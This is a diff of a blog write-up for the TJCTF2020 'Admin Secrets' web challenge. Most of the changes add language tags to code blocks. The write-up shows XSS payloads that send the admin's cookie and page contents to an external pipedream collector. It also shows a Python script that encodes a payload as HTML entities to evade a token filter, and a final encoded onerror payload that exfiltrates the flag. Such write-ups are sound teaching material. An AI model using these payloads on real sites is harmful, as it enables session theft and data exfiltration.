@@ -2,16 +2,13 @@
 title: TJCTF2020 - Admin Secrets
 author: Siahaan
 date: 2020-10-31 11:33:00 +0800
-categories: [CTF, Web Exploitation]
-tags: [TJCTF2020]
-math: true
-mermaid: true
+categories: [Web, XSS]
 ---
 
 Given a website, where a person can login and register. Both are irrelevant to the challenge, so I will cut the chase. The other feature, the 'relevant' feature of the challenge, is a feature that allows user to write a note and even send the note to an **admin** (evil laugh). It isn't hurt to think that this might be an XSS challenge, and I did that. 
 
 To start working on the XSS, I submitted a simple fuzzing payload as a sanity check: 
-```
+```html
 <script>alert(1)</script>
 ``` 
 and the mighty alert box appeared.
@@ -22,7 +19,7 @@ and the mighty alert box appeared.
 
 Since XSS is not a dream anymore, the next step is to do the basic: steal the admin cookie. ArkAngels had already did the hardwork for this by the time I started working on this challenge. Long story short, I spin up a [RequestBin](https://requestbin.com/) to capture the stolen cookie and submitted this payload:
 
-```
+```html
 <script>
 var req = new XMLHttpRequest();
 req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?cookie=' + document.cookie);
@@ -50,7 +47,7 @@ The cookie is nothing but a hint to **check the admin console**. At first I thou
 
 Then I tried to smuggle the content of the `admin_console` tag from the admin (since they said "only the admin can see it"). I modified and submitted this payload for that purpose:
 
-```
+```html
 <script>
 	var req = new XMLHttpRequest();
 	var target = document.getElementsByClassName('admin_console')[0];
@@ -65,7 +62,7 @@ But that shouldn't be working becase document.getElements* functions return a *l
 
 I modified the payload into something like this:
 
-```
+```html
 <script>
 window.addEventListener("load", function(event) {
     var req = new XMLHttpRequest();
@@ -93,7 +90,7 @@ The value is kinda gibberish because I used `btoa()` function to create a Base64
 
 
 I also had the chance to modify the payload to smuggle the entire page, instead of just the `admin_console` tag content. Here's the modified payload:
-```
+```html
 <script>
 window.addEventListener("load", function(event) {
     var req = new XMLHttpRequest();
@@ -108,7 +105,7 @@ And here's the HTML source code of the entire page, for the sake of your clarity
 
 ![816020dbaa2a6c799b1b60a2e618511a.png](/assets/img/post_images/c8773ee980f540c68bffee694c3078e4.png)
 
-```
+```html
 <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -257,7 +254,7 @@ By that information, I continue exploiting the XSS vulnerability to make the adm
 
 Here's the payload:
 
-```
+```html
 <script>
 window.addEventListener("load", function(event) {
 	var targetButton = document.getElementsByClassName("flag-button");
@@ -294,7 +291,7 @@ To be able to execute Javascript with certain token being banned, I thought of s
 
 When I was working on this challenge I build my own solver script to convert my payload into the HTML Entities format, but you also can use a tool for that (like [this](https://v2.cryptii.com/text/htmlentities)). Here's the script:
 
-```
+```python
 #!/usr/bin/python
 
 payload = """
@@ -329,7 +326,7 @@ print ("<img src=x onerror=%s>" % unicoded)
 ```
 
 And here's the final payload:
-```
+```html
 <img src=x onerror=&#10&#119&#105&#110&#100&#111&#119&#46&#97&#100&#100&#69&#118&#101&#110&#116&#76&#105&#115&#116&#101&#110&#101&#114&#40&#34&#108&#111&#97&#100&#34&#44&#32&#102&#117&#110&#99&#116&#105&#111&#110&#40&#101&#118&#101&#110&#116&#41&#32&#123&#10&#9&#118&#97&#114&#32&#116&#97&#114&#103&#101&#116&#66&#117&#116&#116&#111&#110&#32&#61&#32&#100&#111&#99&#117&#109&#101&#110&#116&#46&#103&#101&#116&#69&#108&#101&#109&#101&#110&#116&#115&#66&#121&#67&#108&#97&#115&#115&#78&#97&#109&#101&#40&#34&#102&#108&#97&#103&#45&#98&#117&#116&#116&#111&#110&#34&#41&#59&#10&#9&#118&#97&#114&#32&#110&#97&#118&#98&#97&#114&#66&#117&#116&#116&#111&#110&#32&#61&#32&#100&#111&#99&#117&#109&#101&#110&#116&#46&#103&#101&#116&#69&#108&#101&#109&#101&#110&#116&#115&#66&#121&#67&#108&#97&#115&#115&#78&#97&#109&#101&#40&#34&#110&#97&#118&#98&#97&#114&#45&#116&#111&#103&#103&#108&#101&#114&#34&#41&#59&#10&#9&#99&#111&#110&#115&#111&#108&#101&#46&#108&#111&#103&#40&#100&#111&#99&#117&#109&#101&#110&#116&#41&#59&#10&#9&#116&#97&#114&#103&#101&#116&#66&#117&#116&#116&#111&#110&#91&#48&#93&#46&#111&#110&#99&#108&#105&#99&#107&#32&#61&#32&#102&#117&#110&#99&#116&#105&#111&#110&#32&#102&#117&#110&#40&#41&#32&#123&#10&#9&#9&#118&#97&#114&#32&#112&#114&#111&#98&#101&#32&#61&#32&#115&#101&#116&#73&#110&#116&#101&#114&#118&#97&#108&#40&#102&#117&#110&#99&#116&#105&#111&#110&#40&#41&#123&#32&#10&#9&#9&#9&#108&#101&#116&#32&#102&#108&#97&#103&#32&#61&#32&#100&#111&#99&#117&#109&#101&#110&#116&#46&#103&#101&#116&#69&#108&#101&#109&#101&#110&#116&#66&#121&#73&#100&#40&#39&#114&#101&#115&#112&#111&#110&#115&#101&#65&#108&#101&#114&#116&#39&#41&#46&#105&#110&#110&#101&#114&#72&#84&#77&#76&#59&#10&#9&#32&#32&#32&#32&#32&#32&#32&#32&#118&#97&#114&#32&#114&#101&#113&#32&#61&#32&#110&#101&#119&#32&#88&#77&#76&#72&#116&#116&#112&#82&#101&#113&#117&#101&#115&#116&#40&#41&#59&#10&#9&#9&#32&#32&#32&#32&#114&#101&#113&#46&#111&#112&#101&#110&#40&#39&#71&#69&#84&#39&#44&#32&#39&#104&#116&#116&#112&#115&#58&#47&#47&#101&#110&#105&#116&#56&#115&#56&#52&#53&#117&#118&#56&#46&#120&#46&#112&#105&#112&#101&#100&#114&#101&#97&#109&#46&#110&#101&#116&#47&#63&#116&#104&#101&#102&#108&#97&#103&#61&#39&#32&#43&#32&#102&#108&#97&#103&#41&#59&#10&#9&#9&#9&#114&#101&#113&#46&#111&#110&#114&#101&#97&#100&#121&#115&#116&#97&#116&#101&#99&#104&#97&#110&#103&#101&#32&#61&#32&#102&#117&#110&#99&#116&#105&#111&#110&#40&#41&#32&#123&#10&#9&#9&#9&#32&#32&#99&#111&#110&#115&#111&#108&#101&#46&#108&#111&#103&#40&#102&#108&#97&#103&#41&#59&#10&#9&#9&#9&#125&#59&#10&#9&#9&#9&#114&#101&#113&#46&#115&#101&#110&#100&#40&#41&#59&#10&#9&#9&#125&#44&#32&#49&#48&#48&#48&#41&#59&#10&#9&#9&#115&#101&#116&#84&#105&#109&#101&#111&#117&#116&#40&#102&#117&#110&#99&#116&#105&#111&#110&#40&#32&#41&#32&#123&#32&#99&#108&#101&#97&#114&#73&#110&#116&#101&#114&#118&#97&#108&#40&#32&#112&#114&#111&#98&#101&#32&#41&#59&#32&#125&#44&#32&#49&#48&#48&#48&#48&#41&#59&#10&#9&#125&#10&#9&#116&#97&#114&#103&#101&#116&#66&#117&#116&#116&#111&#110&#91&#48&#93&#46&#99&#108&#105&#99&#107&#40&#41&#59&#10&#125&#41&#59&#10>
 ```
 
